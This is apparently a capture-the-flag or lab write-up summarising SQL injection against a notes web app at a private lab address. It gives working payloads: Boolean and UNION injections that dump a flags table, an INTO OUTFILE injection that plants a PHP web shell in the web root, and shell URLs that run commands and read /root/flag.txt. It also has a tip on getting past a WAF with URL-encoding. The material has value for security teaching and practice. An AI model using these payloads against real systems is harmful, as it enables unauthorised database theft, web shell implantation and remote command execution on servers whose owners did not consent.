üõ† SQL Injection Exploitation Summary ( Extra Mile)
üß© 1. Vulnerable Endpoint
bash
Copy
Edit
http://192.168.239.101/extramile/index.php?id=
üîç 2. SQLi Discovery Payload
http
Copy
Edit
?id=1 OR 1=1
‚úÖ Returned full list of notes ‚Äî confirms classic numeric-based SQL injection with no input sanitization.

üì• 3. Flag Exfiltration via UNION Injection
http
Copy
Edit
?id=1 UNION SELECT 1,flag FROM flags--
‚úÖ Dumped content of the flags table directly to the second column in the UI.

üêö 4. Web Shell Upload via INTO OUTFILE
URL-encoded payload:

http
Copy
Edit
?id=1+UNION+SELECT+1,'<%3fphp+system($_GET["cmd"])%3b+%3f>'+INTO+OUTFILE+'/var/www/html/shell.php'--
Decoded SQL:

sql
Copy
Edit
UNION SELECT 1, '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'
‚úÖ Result: PHP web shell created at:

arduino
Copy
Edit
http://192.168.239.101/extramile/shell.php
üñ• 5. Remote Command Execution
Access the shell with:

bash
Copy
Edit
http://192.168.239.101/extramile/shell.php?cmd=whoami
http://192.168.239.101/extramile/shell.php?cmd=ls /root
http://192.168.239.101/extramile/shell.php?cmd=cat /root/flag.txt
üß† Notes & Gotchas
The backend query likely looks like:

php
Copy
Edit
"SELECT * FROM notes WHERE id = $id;"
(no quotes ‚Üí numeric injection vector)

App is vulnerable to:

Boolean-based SQLi

UNION-based SQLi

INTO OUTFILE RCE

WAF/400 response triggered on quote (') and keywords like AND unless URL-encoded.
